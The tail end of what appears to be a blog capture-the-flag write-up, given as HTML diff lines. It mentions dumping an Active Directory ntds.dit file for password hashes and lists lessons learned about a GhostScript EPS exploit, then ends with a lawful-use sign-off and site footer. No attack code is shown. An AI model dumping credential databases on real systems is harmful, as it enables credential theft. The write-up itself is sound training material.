+<li><figure><img src="/ox-hugo/2024-10-02-173415_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>It wouldn&rsquo;t be full ownership unless I dump the</strong> <code>ntds.dit</code> <strong>file to get all the hashes now would it?</strong></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-173157_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>I learned about using the GhostScript eps exploit, I was not even aware that existed so that was cool.</li>
+<li>I learned that you can re-direct selenium output (this is important as I have used selenium in previous projects, never to enter anything sensitive but this interesting none-the less)</li>
+<li>I learned not to do boxes when I get sleepy. I got caught for a long time looking for the correct foothold.</li>
+<li>I also learned that you can be really creative when making these boxes, this one was honestly amazing.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>I was sleepy when I started so overlooked a pretty obvious foothold/entrypoint even though it was staring me in the face.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        4672
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 01 0001 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
